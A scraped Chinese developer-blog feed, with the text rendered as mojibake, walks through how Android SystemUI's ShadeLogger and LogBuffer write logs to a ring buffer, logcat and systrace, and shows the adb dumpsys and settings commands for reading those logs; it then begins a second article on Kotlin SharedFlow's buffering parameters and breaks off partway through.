<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8703739dc784899b1cf11f68209179b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767584067&amp;x-signature=dfRThE9mM37cNBDbCx0DFQbjCR4%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
ä¸‹é¢å°±æ¥ä»‹ç»ä¸€ä¸‹è¿™ä¸ªShadeLoggeråˆ°åº•æ˜¯å¦‚ä½•æ‰“å°çš„ã€‚</p>
<h2 data-id="heading-1">åˆ†ææºç ï¼š</h2>
<p>æºç ä½ç½®ï¼š
frameworks/base/packages/SystemUI/src/com/android/systemui/shade/ShadeLogger.kt</p>
<p>æ˜æ˜¾æ˜¯ä¸€ä¸ªktç±»ï¼Œè¿™é‡Œå°±åªæ‹¿ä¸€ä¸ªlogEndMotionEventæ–¹æ³•æ¥è¿›è¡Œæºç åˆ†æ</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">fun <span class="hljs-title">logEndMotionEvent</span><span class="hljs-params">(
    msg: String,
    forceCancel: Boolean,
    expand: Boolean,
)</span>
</span>{
    buffer.<span class="hljs-built_in">log</span>(
        TAG,
        LogLevel.VERBOSE,
        {
            str1 = msg
            bool1 = forceCancel
            bool2 = expand
        },
        { <span class="hljs-string">"$str1; force=$bool1; expand=$bool2"</span> }
    )
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçœ‹åˆ°å®é™…æ˜¯è°ƒç”¨çš„buffer.logæ–¹æ³•ï¼Œä¹Ÿæœ‰å¯¹åº”TAGå’ŒLogLevelç­‰çº§ã€‚
é‚£ä¹ˆä¸‹é¢æ¥çœ‹çœ‹è¿™ä¸ªbuffer.logä¸­çš„bufferå“ªé‡Œæ¥çš„ï¼Œä½†æ˜¯å› ä¸ºè¿™æ„é€ éƒ½æ˜¯é‡‡ç”¨äº†å¾ˆå¤šæ³¨è§£drag2æ–¹å¼ï¼Œæ‰€ä»¥ä¸æ–¹ä¾¿æ‰¾ï¼Œè¿™é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªNotificationPanelViewControllerBaseTestä¸€ä¸ªæµ‹è¯•ç±»æœ‰æ‰‹åŠ¨è¿›è¡Œæ„é€ ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºç›¸å…³è¿‡ç¨‹</p>
<p>frameworks/base/packages/SystemUI/tests/src/com/android/systemui/shade/NotificationPanelViewControllerBaseTest.java</p>
<p>å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fc81ca1ad404ab08490f35a7a38b93d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767584067&amp;x-signature=0RsQ3mlZ3chgXDwodf6X4ZHx9zI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
å†çœ‹çœ‹mShadeLogæ„é€ 
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f6ab6a144e146f8ad7adc45f19026c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767584067&amp;x-signature=oKR46vksQeql%2B7X1bZrl1xFXxIM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>å†çœ‹çœ‹logcatLogBufferæ–¹æ³•
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce11633297744e03a45fc087258d5379~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767584067&amp;x-signature=bxjzvieHYBBJMVLpo32vUKxnQPM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>è¿™é‡Œè°ƒç”¨åˆ°äº†LogBufferç±»,æ³¨æ„è¿™é‡Œtestç±»ç»™çš„æ˜¯50ï¼Œå®é™…çš„Shaderç±»ç»™çš„æ˜¯500
frameworks/base/packages/SystemUI/log/src/com/android/systemui/log/LogBuffer.kt
çœ‹çœ‹logæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-keyword">inline</span> fun <span class="hljs-title">log</span><span class="hljs-params">(
    tag: String,
    level: LogLevel,
    messageInitializer: MessageInitializer,
    noinline messagePrinter: MessagePrinter,
    exception: Throwable? = null,
)</span> </span>{
    val message = <span class="hljs-built_in">obtain</span>(tag, level, messagePrinter, exception)
    <span class="hljs-built_in">messageInitializer</span>(message)
    <span class="hljs-built_in">commit</span>(message)
}
</code></pre>
<p>çœ‹çœ‹obtainæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp">@<span class="hljs-function">Synchronized
    <span class="hljs-keyword">override</span> fun <span class="hljs-title">obtain</span><span class="hljs-params">(
        tag: String,
        level: LogLevel,
        messagePrinter: MessagePrinter,
        exception: Throwable?,
    )</span>: LogMessage {</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">mutable</span>) {
            <span class="hljs-keyword">return</span> FROZEN_MESSAGE
        }
        val message = buffer.<span class="hljs-built_in">advance</span>()<span class="hljs-comment">//å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯bufferä¸­è·å–ï¼Œ</span>
        message.<span class="hljs-built_in">reset</span>(tag, level, System.<span class="hljs-built_in">currentTimeMillis</span>(), messagePrinter, exception)
        <span class="hljs-keyword">return</span> message
    }

</code></pre>
<p>è¿™é‡Œå…¶å®åªæ˜¯çœ‹å‡ºæ¥äº†bufferä¸­æå‡ºäº†ä¸€ä¸ªmessageï¼Œæ ¹æ®ä¼ é€’æ¥çš„tagå’Œmsg
æ¥ä¸‹æ¥é‡ç‚¹çœ‹çœ‹commitæ–¹æ³•</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-keyword">override</span> fun <span class="hljs-title">commit</span><span class="hljs-params">(message: LogMessage)</span> </span>{
    <span class="hljs-keyword">if</span> (echoMessageQueue != null &amp;&amp; echoMessageQueue.<span class="hljs-built_in">remainingCapacity</span>() &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">try</span> {
            echoMessageQueue.<span class="hljs-built_in">put</span>(message)<span class="hljs-comment">//ä¸»è¦å°±æ˜¯æ”¾å…¥é˜Ÿåˆ—</span>
        } <span class="hljs-built_in">catch</span> (e: InterruptedException) {
            <span class="hljs-comment">// the background thread has been shut down, so just log on this one</span>
            <span class="hljs-built_in">echoToDesiredEndpoints</span>(message)
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">echoToDesiredEndpoints</span>(message)
    }
}
</code></pre>
<p>commitä¸»è¦å°±æ˜¯å®ç°å¯¹messageæ”¾å…¥åˆ°echoMessageQueueï¼Œé‚£ä¹ˆä»€ä¹ˆæ—¶å€™å–è¿™ä¸ªé˜Ÿåˆ—å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œè¦çœ‹æœ€å¼€å§‹çš„initæ–¹æ³•ä¸­æœ‰å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹</p>
<pre><code class="hljs language-cpp" lang="cpp">init {
    <span class="hljs-keyword">if</span> (logcatEchoTracker.logInBackgroundThread &amp;&amp; echoMessageQueue != null) {
        <span class="hljs-built_in">thread</span>(start = <span class="hljs-literal">true</span>, name = <span class="hljs-string">"LogBuffer-$name"</span>, priority = Thread.NORM_PRIORITY) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {<span class="hljs-comment">//æ­»å¾ªç¯çš„å–å‡ºé˜Ÿåˆ—</span>
                    <span class="hljs-built_in">echoToDesiredEndpoints</span>(echoMessageQueue.<span class="hljs-built_in">take</span>())<span class="hljs-comment">//è°ƒç”¨echoToDesiredEndpointsæ¥å¤„ç†æ¶ˆæ¯</span>
                }
            } <span class="hljs-built_in">catch</span> (e: InterruptedException) {
                Thread.<span class="hljs-built_in">currentThread</span>().<span class="hljs-built_in">interrupt</span>()
            }
        }
    }
}
</code></pre>
<p>å…·ä½“echoToDesiredEndpointsæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"> <span class="hljs-function"><span class="hljs-keyword">private</span> fun <span class="hljs-title">echoToDesiredEndpoints</span><span class="hljs-params">(message: LogMessage)</span> </span>{
 <span class="hljs-comment">//è·å–logæ‰“å°levelï¼Œå³å…¶å®å¯ä»¥é€šè¿‡å‘½ä»¤æ¥æ§åˆ¶æ‰“å°levelï¼Œè¿™é‡Œçš„levelæœ¬è´¨æ˜¯æ¥è‡ªsettingsï¼Œå…·ä½“å•¥settingså€¼ä¸‹é¢æ“ä½œæ—¶å€™ä¼šè®²è§£</span>
        val includeInLogcat =
            logcatEchoTracker.<span class="hljs-built_in">isBufferLoggable</span>(name, message.level) ||
                logcatEchoTracker.<span class="hljs-built_in">isTagLoggable</span>(message.tag, message.level)
        <span class="hljs-built_in">echo</span>(message, toLogcat = includeInLogcat, toSystrace = systrace)<span class="hljs-comment">//æœ‰äº†ä¸Šé¢levelåï¼Œechoå¼€å§‹å¤„ç†</span>
    }
   <span class="hljs-keyword">private</span> fun <span class="hljs-built_in">echo</span>(message: LogMessage, toLogcat: Boolean, toSystrace: Boolean) {
        <span class="hljs-keyword">if</span> (toLogcat || toSystrace) {
            val strMessage = message.<span class="hljs-built_in">messagePrinter</span>(message)
            <span class="hljs-keyword">if</span> (toSystrace) {
                <span class="hljs-built_in">echoToSystrace</span>(message, strMessage)<span class="hljs-comment">//å¯ä»¥çœ‹è¿™ä¸ªæ—¥å¿—è¿˜æ”¯æŒsystraceç›¸å…³</span>
            }
            <span class="hljs-keyword">if</span> (toLogcat) {
                <span class="hljs-built_in">echoToLogcat</span>(message, strMessage)<span class="hljs-comment">//è¿™é‡Œå°±æ˜¯æœ€æ™®é€šçš„logcatæ‰“å°å‡ºæ¥</span>
            }
        }
    }
<span class="hljs-comment">//å…·ä½“çš„echoToLogcatå…¶å®å°±æ˜¯æ ¹æ®ä¼ é€’è¿›æ¥çš„ç­‰çº§è¿›è¡Œæ™®é€šlogæ‰“å°</span>
  <span class="hljs-keyword">private</span> fun <span class="hljs-built_in">echoToLogcat</span>(message: LogMessage, strMessage: String) {
        <span class="hljs-built_in">when</span> (message.level) {
            LogLevel.VERBOSE -&gt; Log.<span class="hljs-built_in">v</span>(message.tag, strMessage, message.exception)
            LogLevel.DEBUG -&gt; Log.<span class="hljs-built_in">d</span>(message.tag, strMessage, message.exception)
            LogLevel.INFO -&gt; Log.<span class="hljs-built_in">i</span>(message.tag, strMessage, message.exception)
            LogLevel.WARNING -&gt; Log.<span class="hljs-built_in">w</span>(message.tag, strMessage, message.exception)
            LogLevel.ERROR -&gt; Log.<span class="hljs-built_in">e</span>(message.tag, strMessage, message.exception)
            LogLevel.WTF -&gt; Log.<span class="hljs-built_in">wtf</span>(message.tag, strMessage, message.exception)
        }
    }
</code></pre>
<p>åˆ°æ­¤LogBufferæºç ä¹Ÿå°±å¤§æ¦‚åˆ†æå®Œæˆï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹å‡ ä¸ªç»“è®ºï¼š</p>
<p>1ã€æ‰€æœ‰çš„åŸ‹ç‚¹æ—¥å¿—ä¼šä¿å­˜åˆ°bufferä¸­ï¼Œè¿™ä¸ªbufferåªæ˜¯åœ¨å†…å­˜ä¸­çš„ä¸€ä¸ªç¯å½¢bufferï¼Œæœ‰å›ºå®šå¤§å°</p>
<p>2ã€bufferä¸­çš„æ—¥å¿—æ˜¯å¯ä»¥ å®ç°è¾“å‡ºåˆ°logcatå’Œsystraceçš„åŠŸèƒ½</p>
<p>é‚£ä¹ˆå…·ä½“å¦‚ä½•æ§åˆ¶è¾“å‡ºåˆ°logcatï¼Œè¿˜æœ‰å¦‚ä½•çœ‹bufferä¸­çš„æ—¥å¿—å‘¢ï¼Ÿæ¥ä¸‹æ¥çœ‹çœ‹ä½¿ç”¨æ–¹æ³•</p>
<h2 data-id="heading-2">ä½¿ç”¨æ–¹å¼ï¼š</h2>
<p>åœ¨ç±»çš„æœ€å¼€å§‹éƒ¨åˆ†æœ‰å¦‚ä¸‹çš„ä½¿ç”¨æ³¨é‡Šï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/**
 * A simple ring buffer of recyclable <span class="hljs-built_in">log</span> messages
 *
 * The goal of this class is to <span class="hljs-built_in">enable</span> logging that is both extremely chatty and extremely
 * lightweight. If <span class="hljs-keyword">done</span> properly, logging a message will not result <span class="hljs-keyword">in</span> any heap allocations or
 * string generation. Messages are only converted to strings <span class="hljs-keyword">if</span> the <span class="hljs-built_in">log</span> is actually dumped (usually
 * as the result of taking a bug report).
 *
 * You can dump the entire buffer at any time by running:
 * ```
 * $ adb shell dumpsys activity service com.android.systemui/.SystemUIService &lt;bufferName&gt;
 * ```
 *
 * ...<span class="hljs-built_in">where</span> `bufferName` is the (case-sensitive) [name] passed to the constructor.
 *
 * By default, only messages of WARN level or higher are echoed to logcat, but this can be adjusted
 * locally (usually <span class="hljs-keyword">for</span> debugging purposes).
 *
 * To <span class="hljs-built_in">enable</span> logcat echoing <span class="hljs-keyword">for</span> an entire buffer:
 * ```
 * $ adb shell settings put global systemui/buffer/&lt;bufferName&gt; &lt;level&gt;
 * ```
 *
 * To <span class="hljs-built_in">enable</span> logcat echoing <span class="hljs-keyword">for</span> a specific tag:
 * ```
 * $ adb shell settings put global systemui/tag/&lt;tag&gt; &lt;level&gt;
 * ```
 *
 * In either <span class="hljs-keyword">case</span>, `level` can be any of `verbose`, `debug`, `info`, `warn`, `error`, `assert`, or
 * the first letter of any of the previous.
 *
 * In SystemUI, buffers are provided by LogModule. Instances should be created using a SysUI
 * LogBufferFactory.
 *
 * @param name The name of this buffer, printed when the buffer is dumped and <span class="hljs-keyword">in</span> some other
 *   situations.
 * @param maxSize The maximum number of messages to keep <span class="hljs-keyword">in</span> memory at any one time. Buffers start
 *   out empty and grow up to [maxSize] as new messages are logged. Once the buffer<span class="hljs-string">'s size reaches
 *   the maximum, it behaves like a ring buffer.
 */
</span></code></pre>
<p>å…¶å®ä¸Šé¢å·²ç»å†™çš„å¾ˆè¯¦ç»†äº†ï¼Œä¸»è¦å°±æ˜¯2ä¸ªæ ¸å¿ƒç‚¹ï¼Œä¸€ä¸ªå¯ä»¥é€šè¿‡dumpsysçœ‹æ‰€æœ‰æ—¥å¿—ï¼Œä¸€ä¸ªæ˜¯å¯ä»¥æ§åˆ¶logcatè¾“å‡º</p>
<p>æ§åˆ¶dumpsysæŸ¥çœ‹æ–¹æ³•</p>
<pre><code class="hljs language-bash" lang="bash">adb shell dumpsys activity service com.android.systemui/.SystemUIService &lt;bufferName&gt;
</code></pre>
<p>æ¯”å¦‚è¿™é‡Œçš„å¯¹ShadeLog</p>
<pre><code class="hljs language-bash" lang="bash">adb shell dumpsys activity service com.android.systemui/.SystemUIService ShadeLog
</code></pre>
<p>dumpsysåå¯ä»¥æŸ¥çœ‹åˆ°ç›¸å…³çš„Logï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63f009de1d9e40138ceeb1c73ab8f7f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767584067&amp;x-signature=RLBz8dSsemAF6O8bJhD2CKLc6Cw%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
çœ‹åˆ°è¿™ä¸ªdumpæ—¥å¿—å°±æ„Ÿè§‰éå¸¸è¯¦ç»†çš„è®°å½•äº†Shadeé”å±ç›¸å…³çš„æ“ä½œï¼Œç›¸å…³çš„tagç­‰ä¹Ÿæ˜¯åœ¨ShadeLogger.ktå®šä¹‰çš„
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d720eeb1a15c4748bf84868e68efdaba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767584067&amp;x-signature=0oTjNhmhmRSb4zi0xvzcSx%2Bo%2BLc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¦‚æœæƒ³è¦æ™®é€šlogcatè¾“å‡ºå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-bash" lang="bash"> adb shell settings put global systemui/tag/ShadeLog v
</code></pre>
<p>è¿™é‡Œå…¶å®å°±æ˜¯é…ç½®ä¸€ä¸ªsettingsï¼Œç„¶åä¸Šé¢çš„æåˆ°çš„echoToDesiredEndpointsçš„ logcatEchoTracker.isBufferLoggableå°±ä¼šå»æŸ¥è¯¢è¿™ä¸ªsettingså€¼ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c38f5712a7f4f159df77bcfee3d398c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767584067&amp;x-signature=PRyAod%2FJzvwi5vyMQoh2cNVOlwU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-3">æ€»ç»“å›¾</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42a2fab3f660459fb414694eda463823~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767584067&amp;x-signature=%2FoNfOPuEsQHOWKln6PQFRty8aQE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æ›´å¤šframeworkæŠ€æœ¯å¹²è´§ï¼Œè¯·å…³æ³¨ä¸‹é¢â€œåƒé‡Œé©¬å­¦æ¡†æ¶â€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆä½ çš„ SharedFlow ä¸å·¥ä½œï¼Ÿæ·±æŒ–è¿™ 3 ä¸ªå…³é”®å‚æ•°]]></title>    <link>https://juejin.cn/post/7588461466599227443</link>    <guid>https://juejin.cn/post/7588461466599227443</guid>    <pubDate>2025-12-29T04:04:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588461466599227443" data-draft-id="6907024593081335816" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆä½ çš„ SharedFlow ä¸å·¥ä½œï¼Ÿæ·±æŒ–è¿™ 3 ä¸ªå…³é”®å‚æ•°"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-29T04:04:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ½œé¾™å‹¿ç”¨ä¹‹åŒ–éª¨é¾™"/> <meta itemprop="url" content="https://juejin.cn/user/2313028195058471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆä½ çš„ SharedFlow ä¸å·¥ä½œï¼Ÿæ·±æŒ–è¿™ 3 ä¸ªå…³é”®å‚æ•°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2313028195058471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ½œé¾™å‹¿ç”¨ä¹‹åŒ–éª¨é¾™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:04:45.000Z" title="Mon Dec 29 2025 04:04:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Kotlin åç¨‹çš„å“åº”å¼ç¼–ç¨‹ä¸­ï¼ŒSharedFlow ä½œä¸ºçƒ­æµï¼ˆHot Flowï¼‰çš„æ ¸å¿ƒç»„ä»¶ï¼Œè¢«å¹¿æ³›åº”ç”¨äºçŠ¶æ€ç®¡ç†ã€äº‹ä»¶æ€»çº¿ç­‰åœºæ™¯ã€‚å…¶ä¸­ä¸‰ä¸ªå…³é”®å‚æ•° replayã€extraBufferCapacity å’Œ onBufferOverflow å…±åŒå†³å®šäº†æµçš„è¡Œä¸ºç‰¹æ€§ã€‚æœ¬æ–‡å°†æ·±å…¥å‰–æè¿™ä¸‰ä¸ªå‚æ•°åœ¨è®¢é˜…å‰åã€ä¸åŒå‘å°„æ–¹å¼ä¸‹çš„è¡¨ç°å·®å¼‚ï¼Œå¹¶æä¾›å®ç”¨çš„é…ç½®æŒ‡å—ã€‚</p>
<h3 data-id="heading-0">ä¸€ã€ä¸‰å‚æ•°åŸºç¡€è§£æ</h3>
<h4 data-id="heading-1">1.1 å‚æ•°å®šä¹‰</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85f5eda3ac05497fbdcee9ae51fe4eb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=AHLl0q6nY5L%2Fun8QMwqPJEb8I%2Bk%3D" alt="image.png" loading="lazy"/></p>
<p>å‚æ•°è¯´æ˜ï¼š</p>





























<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>é»˜è®¤å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>replay</td><td>Int</td><td>0</td><td>æ–°è®¢é˜…è€…ç«‹å³æ¥æ”¶çš„å†å²å€¼æ•°é‡</td></tr><tr><td>extraBufferCapacity</td><td>Int</td><td>0</td><td>é¢å¤–ç¼“å†²åŒºå®¹é‡ï¼ˆä¸å« replayï¼‰</td></tr><tr><td>onBufferOverflow</td><td>BufferOverflow</td><td>SUSPEND</td><td>ç¼“å†²åŒºæº¢å‡ºæ—¶çš„å¤„ç†ç­–ç•¥</td></tr></tbody></table>
<h4 data-id="heading-2">1.2 BufferOverflow ç­–ç•¥æšä¸¾</h4>
